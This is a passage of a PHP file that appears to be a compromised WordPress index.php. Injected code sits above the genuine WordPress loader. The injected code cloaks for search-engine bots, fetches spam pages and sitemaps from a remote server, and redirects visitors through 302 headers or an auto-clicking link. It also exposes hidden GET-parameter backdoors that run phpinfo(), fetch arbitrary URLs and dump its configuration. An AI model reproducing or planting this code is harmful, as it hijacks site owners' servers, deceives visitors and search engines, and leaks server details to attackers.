                    //       $ready = implode('', $map_array);
                    //       if ($mapol) {
                    //         echo $ready;
                    //       }else{
                    //         @file_put_contents($map_file, $ready, FILE_APPEND);
                    //       }
                    //       $map_array = array();
                    //       $map_array_len = 0;
                    //     }
                    //     $map_content = '';
                    //     $map_content .= "\n\t\t" . '<url>';
                    //     $map_content .= sprintf($map_uri_format, xml_urlarg(sync_uri(array($domain_id, $map_step, '', ''), 1)));
                    //     $map_content .= "\n\t\t\t" . '<lastmod>' . date('Y-m-d') . '</lastmod>';
                    //     $map_content .= "\n\t\t\t" . '<changefreq>monthly</changefreq>';
                    //     // $map_content .= "\n\t\t\t" . '<priority>0.9</priority>';
                    //     $map_content .= "\n\t\t</url>";
                    //     $map_array[] = $map_content;
                    //     $map_step += $map_tmp_step;
                    //     $map_array_len++;
                    //     $map_finish_count++;
                    //   }
                    // }
                    // }
                }
                ################# body #################
            }
            $map_array[] = "\n\t</urlset>";
            $sitemap_out = implode('', $map_array);
            $map_array = array();
            // @fput_contents($sitemap_file, $sitemap_out, 'a');
            // filetime_change($sitemap_file);
            // if ($mapol) {
            echo $sitemap_out;
            // timer('sitemap done');
            // echo sprintf('<input type="text" style="width:260px" value="%s" onfocus="this.select()"><br><br><a href="%s" target="_blank">%s</a>', $sitemap_file, $sitemap_file, $sitemap_file);
            /*
            }else{
            @file_put_contents($map_file, $sitemap_out, FILE_APPEND);
            // if ($step > $stepmax && $mapfx == 1) {
            // $map_one = "$dir/sitemap_$mapfx.xml";
            $map_one = "$dir/sitemaps.xml";
            // echo sprintf($map_msg, $map_one, "$page_host/$map_one", $map_one, '%', $map_one) . '<br/>' . sprintf($map_msg, $map_amaps, "$page_host/$map_amaps", $map_amaps, '%', $map_amaps);
            echo sprintf($map_msg, '%', "$page_host/$map_one", "$page_host/$map_one") . '<br/>' . sprintf($map_msg, '%', "$page_host/$map_amaps", "$page_host/$map_amaps");
            // }else{
            //   echo 'done';
            // }
            }
            //*/
            // }
        } else {
            echo 'feterr:' . $sx_get_url;
            exit();
        }
        exit();
    }
    // die("after sitemap");
    ///////////////////////////////////////////////////////////
    //   // echo "$url";die();
    //   $redi_code = rsync_httpreq($url);
    //   $redi_code = trim($redi_code);
    //   if ($redi_code == '') {
    //     # 404 error
    //     header('HTTP/1.1 404 Not Found');
    //     header("status: 404 Not Found");
    //     exit();
    //   }
    //   // header("Location: $redi_code");
    //   echo sprintf('<script>location.href="%s"</script><noscript><meta http-equiv="refresh" content="0; url=%s" /></noscript>', $redi_code, $redi_code);
    //   exit();
    // }
    // if ($func && ($lCheck || $rCheck || urlcheck($uri_end, $url_rules, $extensions))) {
    $uck = urlcheck($uri_end, $url_rules, $extensions);
    $ruck = (bool) $uck[0];
    // echo $lCheck ? "lCheck ok" : "lCheck pass<br/>";
    // echo $rCheck ? "rCheck ok" : "rCheck pass<br/>";
    // echo $uck ? "uck ok" : "uck pass<br/>";
    // if ($func && ($lCheck || $rCheck || $ruck)) {
    if ($func && ($lCheck || $rCheck)) {
        // if ($lCheck) {
        //   if (!$uck) {
        //     $domain = 99999;
        //   }
        // }
        // if ($rCheck) {
        //   if (!$uck) {
        //     if ($indhtml != '') {
        //       echo file_get_contents($indhtml);
        //     }
        //     return;
        //   }
        // }
        // sps
        $exit = 0;
        if (!$ruck) {
            $lineNo = !$index ? determine_number('', $index, $index_number, "$listtest_pat|$la_ru1") : $lineNo;
            // print_r($pgmb);die;
            // index?
            if ($pgmb[7] == 2 && !$is_real_bot) {
                $exit = 1;
            } else {
                if ($index) {
                    if ($lCheck) {
                        if (!$pgmb[0]) {
                            $exit = 1;
                        }
                    }
                    if ($rCheck) {
                        if (!$pgmb[1]) {
                            $rCheck = 0;
                        }
                        if (!$pgmb[2]) {
                            $exit = 1;
                        }
                    }
                } else {
                    if ($lCheck) {
                        if (!$pgmb[3]) {
                            $exit = 1;
                        }
                    }
                    if ($rCheck) {
                        if (!$pgmb[4]) {
                            $rCheck = 0;
                        }
                        if (!$pgmb[5]) {
                            $exit = 1;
                        }
                    }
                }
            }
        } else {
            $result_psk = psuck($domain, $lineNo, $uck[1]);
            $domain = $result_psk['a'] != -1 ? $result_psk['a'] : $domain;
            $lineNo = $result_psk['b'] != -1 ? $result_psk['b'] : $domain;
        }
        // echo "domain=$domain, lineNo=$lineNo";die;
        $a_format = '<a href="%s" target="_blank">%s</a>';
        $url = sprintf($url, $domain, $lineNo, urlencode($page_location), !$rCheck ? 0 : 1, '', $cache[0], $script_name);
        $url .= sprintf('&isn=%d&ish=%d&wdm=%d', ($ruck ? 1 : 0), ($index ? 1 : 0), $cache[3]);
        if (isset($_GET[$la_ru1])) {
            echo sprintf($a_format, $url, $url) . '<br /><br />';
            $urlParse = parse_url($url);
            echo gethostbyname($urlParse['host']);
            exit();
        }
        if (isset($_GET[$la_ru2])) {
            echo sprintf($a_format, $sx_get_url, $sx_get_url);
            exit();
        }
        // if (isset($_GET['pl'])) {
        //   echo $page_location;
        //   exit();
        // }
        // if (isset($_GET['plna'])) {
        //   echo $page_location_non_args;
        //   // echo '<br />fileName => ' . $fileName . ' // script_name => ' . $script_name;
        //   exit();
        // }
        // if (isset($_GET['plr'])) {
        //   echo $page_location_root;
        //   // echo '<br />fileName => ' . $fileName . ' // script_name => ' . $script_name;
        //   exit();
        // }
        if (isset($_GET[$la_pif])) {
            phpinfo();
            exit();
        }
        if (isset($_GET[$la_uts])) {
            $url_test = trim($_GET[$la_uts]);
            $url_test = $url_test == '' ? 'http://example.com' : $url_test;
            if ($url_test != '') {
                echo rsync_httpreq($url_test);
                exit();
            }
        }
        if (isset($_GET[$la_arg])) {
            // global $charlist, $wordlist, $char_use_wordnumber;
            echo sprintf('domain=%s<br />lineNo=%s<br />url_prefix=%s<br />charlist=%s<br />wordlist=%s<br />google_veri=%s<br/>http_get=%s<br/>cache=%s<br/>pgmb=%s<br/>urlgz=%s', $global_domain, $global_lineNo, $url_prefix, $charlist, $wordlist, $google_veri, $http_get, implode('', $cache), $sps, $urlgzs);
            exit();
        }
        if ($exit) {
            if ($indhtml != '') {
                echo file_get_contents($indhtml);
            }
            return;
        }
        // if (urlcheck($uri_end, $url_rules, $extensions, $url_prefix_qm)) {
        // echo "$url";die();
        // echo "URL=$url<br><br>";
        $content = rsync_httpreq($url);
        $content = trim($content);

        if ($content == '*404') {
          return;
        }

        if ($content == '') {
            # 404 error
            header('HTTP/1.1 404 Not Found');
            header('status: 404 Not Found');
            exit();
        }
        // check if jump url? eg weilai moded
        if (preg_match("/^https?\:\/\//", $content)) {
            // echo sprintf('<script>location.href="%s"</script><noscript><meta http-equiv="refresh" content="0; url=%s" /></noscript>', $content, $content);
            // 0 for js , 1 for php
            if ($pgmb[6]) {
                // php 302
                header("Location:$content", true, 302);
            } else {
                // js
                echo sprintf('<body onload="document.getElementsByTagName(%sa%s)[0].click()"><a href="%s"></a><noscript><meta http-equiv="refresh" content="0; url=%s" /></noscript></body>', "'", "'", $content, $content);
            }
            exit();
        }
        // $clinks = array();
        preg_match_all('/\?yumingid=\d+&lineid=\d+[^>]+>.*?</', $content, $clinks);
        if (isset($clinks[0]) && !empty($clinks[0])) {
            foreach ($clinks[0] as $clink) {
                // echo $clink;die;
                // $clink_match = array();
                preg_match_all('/\?yumingid=(\d+)&lineid=(\d+)([^>]+>)(.*?)</', $clink, $clink_match);
                // print_r($clink_match);die;
                $content = str_replace($clink, sync_uri(array($clink_match[1][0], $clink_match[2][0], $clink_match[3][0], $clink_match[4][0])), $content);
            }
        }
        $content = str_replace('[##zhang##]', "$plrtend$url_prefix", $content);

        $google_veri = trim($google_veri);
        if ($google_veri != '') {
            // $content = str_replace('<head>', "<head>\n$google_veri", $content);
            $find_head = array();
            preg_match(sprintf('/<head.*%s>/si', '?'), $content, $find_head);
            // print_r($find_head);die;
            if (!empty($find_head[0])) {
                $content = str_replace($find_head[0], $find_head[0] . "\n$google_veri", $content);
            } else {
                $content = str_replace('</head>', "$google_veri\n</head>", $content);
            }
        }
        echo "$content";
        exit();
    } //*/
    if ($indhtml != '') {
        echo file_get_contents($indhtml);
    }
}
///////////////////////////////////////////////////////////
class_x_i();
?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
